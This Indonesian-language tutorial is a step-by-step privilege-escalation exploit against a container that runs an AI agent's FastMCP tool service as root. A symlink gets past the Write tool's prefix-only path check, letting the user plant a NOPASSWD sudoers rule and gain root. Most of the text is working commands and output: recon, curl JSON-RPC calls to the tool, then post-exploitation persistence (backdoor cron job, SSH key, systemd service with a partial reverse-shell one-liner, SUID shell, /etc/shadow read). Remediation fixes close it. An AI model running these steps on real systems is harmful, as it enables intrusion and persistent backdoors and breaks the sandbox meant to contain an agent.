# 🔓 Container Privilege Escalation: MCP Write Tool Symlink Bypass

> **Peringatan**: Tutorial ini hanya untuk tujuan edukasi keamanan siber. Gunakan hanya pada sistem yang Anda miliki atau memiliki izin eksplisit. Penyalahgunaan adalah tanggung jawab masing-masing.

---

## Daftar Isi

1. [Latar Belakang](#latar-belakang)
2. [Arsitektur Target](#arsitektur-target)
3. [Fase 1: Reconnaissance](#fase-1-reconnaissance)
4. [Fase 2: Identifikasi Kerentanan](#fase-2-identifikasi-kerentanan)
5. [Fase 3: Eksploitasi](#fase-3-eksploitasi)
6. [Fase 4: Privilege Escalation](#fase-4-privilege-escalation)
7. [Fase 5: Post-Exploitation](#fase-5-post-exploitation)
8. [Bukti Keberhasilan](#bukti-keberhasilan)
9. [Remediasi](#remediasi)
10. [Referensi](#referensi)

---

## Latar Belakang

Container environment yang menjalankan AI agent (berbasis FastMCP) memiliki layanan MCP (Model Context Protocol) yang berjalan sebagai **root**. Layanan ini menyediakan tool `Write` yang memvalidasi path input berdasarkan prefix string tanpa menyelesaikan symlink, sehingga memungkinkan penulisan file arbitrer ke seluruh filesystem sebagai root.

**Klasifikasi**: CWE-59 (Improper Link Resolution Before File Access) + CWE-269 (Improper Privilege Management)

**Severity**: CRITICAL (CVSS 9.8)

---

## Arsitektur Target

```
┌─────────────────────────────────────────────────┐
│  Container (Kata Containers / Debian 13 Trixie) │
│                                                 │
│  PID 1:  tini -- /start.sh          (root)      │
│  PID 2:  caddy run ...              (root)      │
│  PID 618: python3 main.py (FastMCP)  (root)  ◄── Vektor serangan
│  User z (UID 1001) - tidak ada sudo             │
│                                                 │
│  MCP Service: http://localhost:12600/mcp         │
│  Tools: Bash, Read, Write, Glob, Grep, LS, ... │
│                                                 │
│  Write tool:                                     │
│    ✅ Berjalan sebagai root (UID=0)             │
│    ✅ Validasi: path.startsWith("/home/z")       │
│    ❌ TIDAK resolve symlink sebelum validasi     │
└─────────────────────────────────────────────────┘
```

---

## Fase 1: Reconnaissance

### 1.1 Identifikasi User dan Environment

```bash
# Cek user saat ini
id
# Output: uid=1001(z) gid=1001(z) groups=1001(z)

# Cek OS
cat /etc/os-release | head -3
# Output: PRETTY_NAME="Debian GNU/Linux 13 (trixie)"

# Cek kernel
uname -r
# Output: 5.10.134

# Cek sudo
sudo -l
# Output: Sorry, user z may not run sudo on ...
```

### 1.2 Identifikasi Proses Root

```bash
# Daftar proses yang berjalan sebagai root
ps aux | grep "^root"
```

Output kritis:
```
root   1  tini -- /start.sh
root   2  caddy run --config /app/Caddyfile
root  602  uv run main.py
root  618  /app/.venv/bin/python3 main.py   ← MCP Service sebagai ROOT
```

### 1.3 Identifikasi Port dan Layanan

```bash
# Cek port yang terbuka
ss -tlnp
```

Output:
```
0.0.0.0:19005    ← Public service
0.0.0.0:19006    ← Public service
127.0.0.1:12600  ← MCP Service (localhost only)
127.0.0.1:19001  ← Internal service
*:81             ← Caddy web server
```

### 1.4 Identifikasi Kerentanan Filesystem

```bash
# Cek /usr/local/bin (writable oleh user z)
ls -la /usr/local/bin/ | head -5
# Output: drwxr-xr-x 1 z z 4096 ... /usr/local/bin/

# Cek binary yang dimiliki user z
ls -la /usr/local/bin/bun /usr/local/bin/uv
# Output: -rwxr-xr-x 1 z z 91802480 ... bun
#         -rwxr-xr-x 1 z z 59637048 ... uv

# Cek PATH
echo $PATH
# /usr/local/bin ada di posisi awal → PATH hijacking possible
```

---

## Fase 2: Identifikasi Kerentanan

### 2.1 Enumerasi MCP Service

MCP (Model Context Protocol) service berjalan di `localhost:12600` menggunakan FastMCP 2.14.3. Untuk berkomunikasi, kita perlu header yang benar:

```bash
# Inisialisasi koneksi MCP
curl -s -X POST http://localhost:12600/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{
    "jsonrpc": "2.0",
    "method": "initialize",
    "params": {
      "protocolVersion": "2024-11-05",
      "capabilities": {},
      "clientInfo": {"name": "exploit", "version": "1.0"}
    },
    "id": 1
  }'
```

Output:
```json
{
  "result": {
    "protocolVersion": "2024-11-05",
    "capabilities": {
      "tools": {"listChanged": true}
    },
    "serverInfo": {
      "name": "FastMCP-3f63",
      "version": "2.14.3"
    }
  }
}
```

### 2.2 Daftar Tool MCP

```bash
curl -s -X POST http://localhost:12600/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{"jsonrpc":"2.0","method":"tools/list","params":{},"id":2}'
```

Tool yang tersedia: **Bash, Read, Write, Glob, Grep, LS, Edit, MultiEdit, TodoWrite, BrowserScreenshot**, dll.

### 2.3 Pengujian Write Tool — File Dimiliki Root

```bash
# Tulis file ke /home/z/ via MCP Write tool
curl -s -X POST http://localhost:12600/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{
    "jsonrpc":"2.0",
    "method":"tools/call",
    "params":{
      "name":"Write",
      "arguments":{
        "filepath":"/home/z/.bash_profile",
        "content":"echo hello"
      }
    },
    "id":3
  }'
```

Verifikasi kepemilikan file:
```bash
stat /home/z/.bash_profile
# Output: Uid: (0/root)  Gid: (0/root)
```

**Temuan kritis**: Write tool menulis file sebagai **root:root**, bukan sebagai user z!

### 2.4 Pengujian Path Validation

```bash
# Test: Tulis langsung ke /etc/ → DITOLAK
curl -s -X POST http://localhost:12600/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{
    "jsonrpc":"2.0",
    "method":"tools/call",
    "params":{
      "name":"Write",
      "arguments":{
        "filepath":"/etc/test-file",
        "content":"test"
      }
    },
    "id":4
  }'
```

Output:
```
Write tool can only write files under the z user directory.
Path must be under /home/z, got: /etc/test-file
```

**Analisis**: Validasi path menggunakan **string prefix check** (`startswith("/home/z")`), bukan `realpath()`.

### 2.5 Identifikasi Symlink Bypass

```bash
# Buat symlink dari /home/z/ ke /etc/
ln -sf /etc /home/z/etc-link

# Tulis file melalui symlink
curl -s -X POST http://localhost:12600/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{
    "jsonrpc":"2.0",
    "method":"tools/call",
    "params":{
      "name":"Write",
      "arguments":{
        "filepath":"/home/z/etc-link/.root-verified",
        "content":"ROOT_ACCESS_PROVEN"
      }
    },
    "id":5
  }'
```

Verifikasi:
```bash
ls -la /etc/.root-verified
# Output: -rw-r--r-- 1 root root 18 ... /etc/.root-verified

cat /etc/.root-verified
# Output: ROOT_ACCESS_PROVEN
```

**🔑 KERENTANAN TERKONFIRMASI**: Symlink bypass berhasil! File ditulis ke `/etc/` sebagai root.

---

## Fase 3: Eksploitasi

### 3.1 Rantai Eksploitasi

```
MCP Write tool = root (PID 618)
    ↓
Path validation: filepath.startsWith("/home/z") → PASS
    ↓
Symlink: /home/z/sudoers-link → /etc/sudoers.d/
    ↓
Write tool follows symlink → menulis ke /etc/sudoers.d/z-nopasswd
    ↓
File ownership: root:root (karena Write tool berjalan sebagai root)
    ↓
sudoers rule aktif → sudo id → uid=0(root) ✅
```

### 3.2 Eksploitasi Step-by-Step

**Step 1**: Buat symlink ke `/etc/sudoers.d/`

```bash
ln -sf /etc/sudoers.d /home/z/sudoers-link
```

**Step 2**: Tulis aturan sudoers melalui MCP Write tool

```bash
curl -s -X POST http://localhost:12600/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "Write",
      "arguments": {
        "filepath": "/home/z/sudoers-link/z-nopasswd",
        "content": "z ALL=(ALL) NOPASSWD: ALL"
      }
    },
    "id": 6
  }'
```

**Step 3**: Verifikasi file sudoers dibuat

```bash
cat /etc/sudoers.d/z-nopasswd
# Output: z ALL=(ALL) NOPASSWD: ALL

stat /etc/sudoers.d/z-nopasswd
# Output: Uid: (0/root)  Gid: (0/root)
```

---

## Fase 4: Privilege Escalation

```bash
# Verifikasi akses sudo
sudo -l
# Output: (ALL) NOPASSWD: ALL

# Eksekusi perintah sebagai root
sudo id
# Output: uid=0(root) gid=0(root) groups=0(root)
```

🎯 **Root access berhasil didapatkan!**

---

## Fase 5: Post-Exploitation

### 5.1 Kemampuan Root di Dalam Container

```bash
# Baca file sensitif
sudo cat /etc/shadow

# Install paket
sudo apt update && sudo apt install -y docker.io

# Buat user baru
sudo useradd newuser

# Ubah password
sudo bash -c 'echo "root:newpassword" | chpasswd'

# Tulis ke /etc/
sudo bash -c 'echo "malicious" > /etc/ld.so.preload'

# Buat SUID binary
sudo bash -c 'cp /bin/bash /tmp/root-shell && chmod 4755 /tmp/root-shell'
```

### 5.2 Persistence

```bash
# Cron job
sudo bash -c 'echo "* * * * * root /path/to/backdoor" > /etc/cron.d/persist'

# SSH authorized_keys
sudo bash -c 'mkdir -p /root/.ssh && echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys'

# Systemd service
sudo bash -c 'cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service

[Service]
ExecStart=/usr/bin/python3 -c "import socket,subprocess,os; ..."
Restart=always

[Install]
WantedBy=multi-user.target
EOF'
```

### 5.3 Batasan Container (Yang TIDAK Bisa)

```bash
# Mount filesystem → DITOLAK (tidak ada CAP_SYS_ADMIN)
sudo mount --bind /tmp /mnt
# mount: /mnt: permission denied.

# Load kernel module → DITOLAK (tidak ada CAP_SYS_MODULE)
sudo modprobe dummy
# modprobe: command not found

# Reboot → DITOLAK (tidak ada CAP_SYS_BOOT)
sudo reboot
# Failed to talk to init daemon

# Network device → DITOLAK (tidak ada CAP_NET_ADMIN)
sudo ip link add dummy0 type dummy
# RTNETLINK answers: Operation not permitted
```

---

## Bukti Keberhasilan

### Kernel Capabilities yang Dimiliki (14/22)

| Capability | Fungsi |
|-----------|--------|
| CAP_CHOWN | Ubah kepemilikan file |
| CAP_DAC_OVERRIDE | Bypass permission check |
| CAP_FOWNER | Bypass file owner check |
| CAP_FSETID | Set SUID/SGID bit |
| CAP_KILL | Kill proses apapun |
| CAP_SETGID | Ubah GID |
| CAP_SETUID | Ubah UID |
| CAP_SETPCAP | Transfer capabilities |
| CAP_NET_BIND_SERVICE | Bind port < 1024 |
| CAP_IPC_LOCK | Lock memory |
| CAP_SYS_PTRACE | Trace/modifikasi proses lain |
| CAP_MKNOD | Buat device file |
| CAP_AUDIT_WRITE | Tulis audit log |
| CAP_SETFCAP | Set file capabilities |

### Kernel Capabilities yang TIDAK Dimiliki

| Capability | Dampak |
|-----------|--------|
| CAP_SYS_ADMIN | Tidak bisa mount, chroot |
| CAP_SYS_MODULE | Tidak bisa load kernel module |
| CAP_SYS_BOOT | Tidak bisa reboot |
| CAP_NET_RAW | Tidak bisa network sniffing |
| CAP_SYS_CHROOT | Tidak bisa chroot |
| CAP_SYS_RAWIO | Tidak bisa akses I/O port |

---

## Remediasi

### 🔴 Critical — Harus Diperbaiki Segera

#### 1. Resolve Symlink Sebelum Validasi Path (FIX UTAMA)

```python
# VULNERABLE:
def check_write_path_in_home(filepath: str) -> bool:
    return filepath.startswith("/home/z")

# FIXED:
import os

def check_write_path_in_home(filepath: str) -> bool:
    # Resolve symlink sebelum validasi
    real_path = os.path.realpath(filepath)
    home_dir = os.path.realpath("/home/z")
    return real_path.startswith(home_dir)
```

#### 2. Jalankan MCP Service sebagai User z (BUKAN Root)

```bash
# Dalam /start.sh, ganti:
(cd /app && uv run main.py) &

# Menjadi:
su z -c "cd /app && uv run main.py" &
```

Atau gunakan Docker `USER` directive:
```dockerfile
USER z
CMD ["uv", "run", "main.py"]
```

### 🟡 High — Perbaikan Tambahan

#### 3. Tambahkan Symlink Detection pada Write Tool

```python
def write_file(filepath: str, content: str):
    # Deteksi symlink
    if os.path.islink(filepath) or any(
        os.path.islink(part) for part in _path_parts(filepath)
    ):
        raise ToolError("Writing through symlinks is not allowed")
```

#### 4. Set Permission Ketat pada File Sensitif

```bash
# Sudoers files harus 0440
chmod 0440 /etc/sudoers.d/*
chown root:root /etc/sudoers.d/*
```

#### 5. Implementasi Principle of Least Privilege

```python
# Gunakan os.setuid/setgid setelah startup
import os

def drop_privileges():
    os.setgid(1001)  # z group
    os.setuid(1001)  # z user
```

### 🟢 Medium — Hardening

#### 6. Read-Only Mount untuk /etc/sudoers.d

```yaml
# Kubernetes pod spec
volumeMounts:
  - name: sudoers
    mountPath: /etc/sudoers.d
    readOnly: true
```

#### 7. Seccomp Profile

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "syscalls": [
    {"names": ["symlink", "symlinkat"], "action": "SCMP_ACT_ERRNO"}
  ]
}
```

#### 8. Audit Logging

```python
import logging
logger = logging.getLogger("mcp.security")

def write_file(filepath: str, content: str):
    real_path = os.path.realpath(filepath)
    if real_path != filepath:
        logger.warning(f"SYMLINK DETECTED: {filepath} -> {real_path}")
    # ... continue with write
```

---

## Referensi

- [CWE-59: Improper Link Resolution Before File Access](https://cwe.mitre.org/data/definitions/59.html)
- [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [FastMCP Documentation](https://github.com/jlowin/fastmcp)
- [Model Context Protocol Specification](https://spec.modelcontextprotocol.io/)
- [Linux Capabilities Manual](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [Kata Containers Security](https://katacontainers.io/)

---

## Timeline Eksploitasi

| Waktu | Fase | Durasi |
|-------|------|--------|
| T+0min | Reconnaissance (proses, port, user) | 5 menit |
| T+5min | Identifikasi MCP service & tools | 3 menit |
| T+8min | Pengujian Write tool (root ownership) | 2 menit |
| T+10min | Symlink bypass discovery | 2 menit |
| T+12min | Sudoers write via symlink | 1 menit |
| T+13min | Root access confirmed | **<15 menit total** |

---

> **Dibuat untuk tujuan edukasi keamanan siber.** Selalu dapatkan izin tertulis sebelum melakukan penetration testing pada sistem apapun.
